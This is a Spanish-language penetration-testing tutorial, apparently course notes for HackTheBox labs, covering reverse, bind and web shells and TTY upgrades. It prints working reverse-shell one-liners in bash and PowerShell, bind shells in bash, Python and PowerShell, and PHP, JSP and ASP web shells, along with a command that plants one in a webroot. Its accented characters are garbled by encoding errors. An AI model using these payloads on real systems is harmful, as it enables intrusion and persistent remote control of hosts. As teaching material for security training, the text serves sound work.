# Types of Shells

## REVERSE SHELL

Un `Reverse Shell` es el tipo m√°s com√∫n, ya que es el m√©todo m√°s r√°pido y sencillo para obtener el control de un host comprometido. Una vez que identificamos una vulnerabilidad en el host remoto que permite la ejecuci√≥n remota de c√≥digo, podemos iniciar un `netcat`receptor en nuestra m√°quina que escuche en un puerto espec√≠fico, por ejemplo, el puerto `1234`. Con este receptor en su lugar, podemos ejecutar un `reverse shell command`que conecta el shell de sistemas remotos, es decir, `Bash`o `PowerShell`a nuestro `netcat`receptor, lo que nos proporciona una conexi√≥n inversa a trav√©s del sistema remoto.

```bash
nc -lvnp 1234
```

Las banderas que estamos utilizando son las siguientes:

| Bandera   | Descripci√≥n                                                                                    |
| --------- | ---------------------------------------------------------------------------------------------- |
| `-l`      | Modo escucha, para esperar a que haya una conexi√≥n para conectarse con nosotros.               |
| `-v`      | Modo detallado, para que sepamos cuando recibimos una conexi√≥n.                                |
| `-n`      | Deshabilite la resoluci√≥n DNS y con√©ctese √∫nicamente desde/hacia IP para acelerar la conexi√≥n. |
| `-p 1234` | El n√∫mero de puerto `netcat`est√° escuchando y se debe enviar la conexi√≥n inversa.              |

Ahora que tenemos un `netcat`oyente esperando una conexi√≥n, podemos ejecutar el comando de shell inverso que se conecta a nosotros.

**Conectar IP de nuevo**

Sin embargo, primero debemos encontrar la IP de nuestro sistema para enviarnos una conexi√≥n inversa. Podemos encontrar nuestra IP con el siguiente comando:

```bash
ip a
```

&#x20;La IP que nos interesa est√° bajo `tun0`, que es la misma red HTB a la que nos conectamos a trav√©s de nuestra VPN.

> **Nota**: Nos estamos conectando a la IP en 'tun0' porque solo podemos conectarnos a las cajas de HackTheBox a trav√©s de la conexi√≥n VPN, ya que no tienen conexi√≥n a internet, y por lo tanto no pueden conectarse a nosotros a trav√©s de internet usando 'eth0'. En un pentest real, puedes estar conectado directamente a la misma red, o realizando un pentest externo, por lo que puedes conectarte a trav√©s del adaptador 'eth0' o similar.

**Comando de Reverse Shell**

El comando que ejecutamos depende del sistema operativo que tenga el host comprometido, es decir, Linux o Windows, y de las aplicaciones y comandos a los que podemos acceder. La p√°gina [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) tiene una lista completa de comandos de shell inverso que podemos usar y que cubren una amplia gama de opciones seg√∫n nuestro host comprometido.

Ciertos comandos de shell inverso son m√°s confiables que otros y, por lo general, se pueden utilizar para obtener una conexi√≥n inversa. Los siguientes comandos son comandos confiables que podemos usar para obtener una conexi√≥n inversa, tanto `bash`en hosts Linux como `Powershell`en hosts Windows comprometidos:

C√≥digo: bash

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

C√≥digo: bash

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

C√≥digo: powershell

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

Podemos utilizar el exploit que tenemos sobre el host remoto para ejecutar uno de los comandos anteriores, es decir, a trav√©s de un exploit de Python o un m√≥dulo de Metasploit, para obtener una conexi√≥n inversa.&#x20;

Como podemos ver, despu√©s de recibir una conexi√≥n en nuestro `netcat`oyente, pudimos escribir nuestro comando y obtener su salida directamente en nuestra m√°quina.

`Reverse Shell`es √∫til cuando queremos obtener una conexi√≥n r√°pida y confiable con nuestro host comprometido. Sin embargo, a `Reverse Shell`puede ser muy fr√°gil. Una vez que se detiene el comando de shell inverso, o si perdemos nuestra conexi√≥n por cualquier motivo, tendr√≠amos que usar el exploit inicial para ejecutar el comando de shell inverso nuevamente para recuperar nuestro acceso.

> **Nota Importante:**
>
> üìò **PHP Reverse Shell** desarrollado por **PentestMonkey** es una herramienta popular para establecer una conexi√≥n de shell inverso en entornos de pruebas de penetraci√≥n. Puedes acceder al c√≥digo fuente del proyecto y utilizarlo en escenarios controlados o con prop√≥sitos educativos.
>
> üîó [Repositorio de PHP Reverse Shell en GitHub](https://github.com/pentestmonkey/php-reverse-shell)

## BIND SHELL

&#x20;A diferencia de un `Reverse Shell`que se conecta a nosotros, nosotros tendremos que conectarnos a √©l en el `targets'`puerto de escucha.

Una vez que ejecutamos un `Bind Shell Command`, comenzar√° a escuchar en un puerto del host remoto y vincular√° el shell de ese host, es decir, `Bash`o `PowerShell`, a ese puerto. Tenemos que conectarnos a ese puerto con `netcat`, y obtendremos el control a trav√©s de un shell en ese sistema.

**Comando de enlace de shell**

Una vez m√°s, podemos utilizar [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md) para encontrar un comando adecuado para iniciar nuestro shell de enlace.

Nota: iniciaremos una conexi√≥n de escucha en el puerto '1234' del host remoto, con IP '0.0.0.0' para que podamos conectarnos a √©l desde cualquier lugar.

Los siguientes son comandos confiables que podemos usar para iniciar un shell de enlace:

C√≥digo: bash

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

C√≥digo: python

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

C√≥digo: powershell

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

***

**Conexi√≥n Netcat**

Una vez que ejecutamos el comando bind shell, deber√≠amos tener un shell esper√°ndonos en el puerto especificado. Ahora podemos conectarnos a √©l.

A diferencia de un `Reverse Shell`, si interrumpimos nuestra conexi√≥n a un shell de enlace por cualquier motivo, podemos volver a conectarnos a √©l y obtener otra conexi√≥n inmediatamente. Sin embargo, si el comando de shell de enlace se detiene por cualquier motivo, o si se reinicia el host remoto, a√∫n perder√≠amos nuestro acceso al host remoto y tendremos que explotarlo nuevamente para obtener acceso.

## TTY&#x20;

Una vez que nos conectamos a un shell a trav√©s de Netcat, notaremos que solo podemos escribir comandos o utilizar la tecla de retroceso. Sin embargo, no podemos mover el cursor de texto hacia la izquierda o la derecha para editar nuestros comandos, ni acceder al historial de comandos con las teclas de flechas. Para habilitar estas funcionalidades, necesitamos actualizar nuestro TTY, asignando el TTY de nuestra terminal al TTY remoto.

Podemos hacer esto utilizando varios m√©todos. Para nuestros prop√≥sitos, emplearemos el m√©todo de `python/stty`. En nuestro shell de Netcat, utilizaremos el siguiente comando para usar Python y actualizar nuestro shell a un TTY completo:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Despu√©s de ejecutar este comando, presionaremos `Ctrl+Z` para enviar el shell al segundo plano y regresar a nuestra terminal local, donde ingresaremos el siguiente comando `stty`:

```bash
^Z
stty raw -echo
fg
```

Una vez que presionemos `fg`, nuestro shell de Netcat volver√° al primer plano. En este punto, la terminal mostrar√° una l√≠nea en blanco. Podemos presionar `Enter` nuevamente para volver a nuestro shell o ingresar `reset` y presionar `Enter` para restaurarlo. En este momento, deber√≠amos tener un shell TTY completamente funcional, con historial de comandos y todas las dem√°s funcionalidades de una terminal est√°ndar.

Es posible que notemos que nuestro shell no ocupa toda la ventana de la terminal. Para solucionar esto, necesitamos ajustar algunas variables. Podemos abrir otra ventana de terminal en nuestro sistema, maximizarla o usar el tama√±o que queramos, y luego ingresar los siguientes comandos para obtener nuestras variables:

```bash
echo $TERM
```

Este comando nos mostrar√° el valor de la variable `TERM`, que podr√≠a ser algo como:

```bash
xterm-256color
```

A continuaci√≥n, obtenemos el tama√±o de las filas y columnas de nuestra terminal:

```bash
tty size
```

Esto nos mostrar√° algo como:

```bash
67 318
```

Con esta informaci√≥n, volvemos a nuestro shell de Netcat y usamos los siguientes comandos para ajustar el tama√±o de la terminal:

```bash
export TERM=xterm-256color
stty rows 67 columns 318
```

Despu√©s de hacer esto, deber√≠amos tener un shell de Netcat que aprovecha todas las funciones de la terminal, similar a una conexi√≥n SSH.

## WEB SHELL

Un **Web Shell** es un tipo de shell accesible a trav√©s de un navegador web. Normalmente, un Web Shell es un script web, como PHP o ASPX, que acepta comandos a trav√©s de par√°metros de solicitud HTTP (como GET o POST), ejecuta esos comandos y muestra la salida en una p√°gina web.

**C√≥mo escribir un Web Shell**

Para escribir un Web Shell, necesitamos un script que reciba un comando a trav√©s de una solicitud GET, lo ejecute y luego imprima su salida. Los scripts de Web Shell suelen ser muy cortos y se pueden memorizar f√°cilmente. Aqu√≠ tienes algunos ejemplos comunes de Web Shell para diferentes lenguajes:

**PHP:**

```php
<?php system($_REQUEST["cmd"]); ?>
```

**JSP:**

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

**ASP:**

```asp
<% eval request("cmd") %>
```

Estos scripts permiten ejecutar comandos del sistema operativo a trav√©s de la interfaz web.&#x20;

> **Nota:** Utilizar Web Shells puede ser extremadamente riesgoso y es importante hacerlo solo en entornos controlados y para fines educativos o de pruebas de seguridad.

### Cargando un Web Shell

Una vez que tenemos nuestro Web Shell, necesitamos colocar el script en el directorio web del host remoto (webroot) para ejecutarlo a trav√©s del navegador. Esto se puede hacer de diferentes maneras, dependiendo de las vulnerabilidades disponibles en el servidor.

#### **M√©todos para Cargar un Web Shell**

1. **A trav√©s de una Vulnerabilidad en la Funci√≥n de Carga:** Si hay una vulnerabilidad en una funci√≥n de carga de archivos, podemos subir nuestro Web Shell a trav√©s de esta funci√≥n. Por ejemplo, si encontramos una carga de archivos en una aplicaci√≥n web, podr√≠amos cargar un archivo llamado `shell.php` y luego acceder a √©l mediante la web para ejecutar comandos.
2. **Escritura Directa en el Webroot:** Si solo tenemos la capacidad de ejecutar comandos remotos a trav√©s de un exploit, podemos escribir nuestro Web Shell directamente en el directorio web del servidor. Para esto, es fundamental identificar la ubicaci√≥n del webroot.

#### **Directorios Webroot Predeterminados**

Aqu√≠ tienes los directorios webroot predeterminados para algunos servidores web comunes:

| Servidor Web | Webroot Predeterminado   |
| ------------ | ------------------------ |
| Apache       | `/var/www/html/`         |
| Nginx        | `/usr/local/nginx/html/` |
| IIS          | `c:\inetpub\wwwroot\`    |
| XAMPP        | `C:\xampp\htdocs\`       |

Para determinar el directorio webroot en el servidor que est√°s atacando, consulta estos directorios. Una vez identificado, puedes usar el comando `echo` para escribir tu Web Shell en ese directorio. Por ejemplo, si est√°s atacando un host Linux que ejecuta Apache, puedes escribir un Web Shell PHP con el siguiente comando:

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

Este comando crea un archivo llamado `shell.php` en el directorio `/var/www/html/`, que luego puedes acceder a trav√©s del navegador para ejecutar comandos.

### Acceso y Uso de un Web Shell

Una vez que hemos cargado nuestro Web Shell, podemos acceder a √©l a trav√©s de un navegador web o utilizando herramientas como `cURL`. Aqu√≠ te mostramos c√≥mo interactuar con el Web Shell para ejecutar comandos.

**Acceso a trav√©s del Navegador**

Puedes visitar la URL del Web Shell en el navegador para ejecutar comandos. Por ejemplo, si has cargado `shell.php` en el servidor comprometido, puedes acceder a √©l de la siguiente manera:

```bash
http://SERVER_IP:PORT/shell.php?cmd=id
```

Este comando ejecutar√° el comando `id` y mostrar√° la salida en el navegador.

**Acceso mediante cURL**

Otra opci√≥n es usar `cURL` desde la l√≠nea de comandos para interactuar con el Web Shell. Ejecuta el siguiente comando para enviar una solicitud HTTP GET y ejecutar el comando `id`:

```bash
curl http://SERVER_IP:PORT/shell.php?cmd=id
```

La salida ser√° similar a:

```kotlin
kotlinCopiar c√≥digouid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Ventajas y Desventajas de un Web Shell**

**Ventajas:**

* **Evasi√≥n de Restricciones de Firewall:** Un Web Shell opera sobre el puerto web (80, 443 o cualquier otro puerto utilizado por la aplicaci√≥n web), lo que evita las restricciones de firewall que podr√≠an bloquear conexiones en puertos no est√°ndar.
* **Persistencia:** Si el host comprometido se reinicia, el Web Shell continuar√° en su lugar, permiti√©ndote acceder a √©l y ejecutar comandos sin necesidad de explotar el host nuevamente.

**Desventajas:**

* **Interactividad Limitada:** A diferencia de los shells reverse y bind, un Web Shell no es tan interactivo. Tendr√°s que enviar solicitudes diferentes para cada comando que quieras ejecutar.
* **Automatizaci√≥n:** En situaciones extremas, puedes escribir un script en Python u otro lenguaje para automatizar el proceso y proporcionar una experiencia de shell web semi-interactiva dentro de tu terminal.

